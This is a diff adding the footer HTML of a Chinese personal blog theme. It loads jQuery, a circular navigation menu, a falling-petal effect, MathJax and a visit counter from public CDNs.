+<script nonce="random123" src='https://cdn.jsdelivr.net/npm/jquery.min.js@3.5.1/jquery.min.js'></script>
+<script nonce="strict-dynamic" src='https://cdn.jsdelivr.net/npm/ismobilejs@1.1.1/dist/isMobile.min.js'></script>
+<script nonce="random123" type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery@2.1.3/dist/jquery.min.js"></script>
+
+
+<script>
+	 
+	var $cdnPrefix = "https://imgapi.cn/api.php";
+</script><script type="text/javascript" nonce="strict-dynamic" src="/js/custom.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery@2.1.3/dist/jquery.min.js"></script><div class="GalMenu GalDropDown">
+	      <div class="circle" id="gal">
+	        <div class="ring"><a href="/" 
+			  target="_blank"style="background-image:url(https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/img/tusiji.jpg);"class="menuItem">首页</a><a href="/zh-cn/music-moive/" 
+			  target="_blank"style="background-image:url(https://imgapi.cn/api.php/images/rightmenu/rightmenu2.jpg);"class="menuItem">音乐影视</a><a href="/zh-cn/mryang/" 
+			  target="_blank"style="background-image:url(https://imgapi.cn/api.php/images/rightmenu/rightmenu3.jpg);"class="menuItem">前方高能</a><a href="/zh-cn/ybc/" 
+			  target="_blank"style="background-image:url(https://imgapi.cn/api.php/images/rightmenu/rightmenu4.jpg);"class="menuItem">秘密通道</a><a href="/zh-cn/talk/" 
+			  target="_blank"style="background-image:url(https://imgapi.cn/api.php/images/rightmenu/rightmenu5.jpg);"class="menuItem">即时文献</a><a href="/zh-cn/sources/" 
+			  target="_blank"style="background-image:url(https://imgapi.cn/api.php/images/rightmenu/rightmenu6.jpg);"class="menuItem">装机资源</a></div></div>
+	</div>
+	<script type="text/javascript">
+	var items = document.querySelectorAll('.menuItem'); 
+	for (var i = 0, l = items.length; i < l; i++) {
+        items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+        items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+      }
+	</script>
+	<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/css/GalMenu.css">
+	<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/js/GalMenu.js"></script>
+	<script type="text/javascript">
+    	$(document).ready(function() {
+        $('body').GalMenu({
+          'menu': 'GalDropDown'
+        })
+      });
+	</script><script src="https://cdn.jsdelivr.net/npm/timelinejs-slider@0.1.0/dist/js/timeline.min.js"></script>
+
+<script nonce="strict-dynamic" src="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/js/sakura.js"></script>
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</body>
+</html>
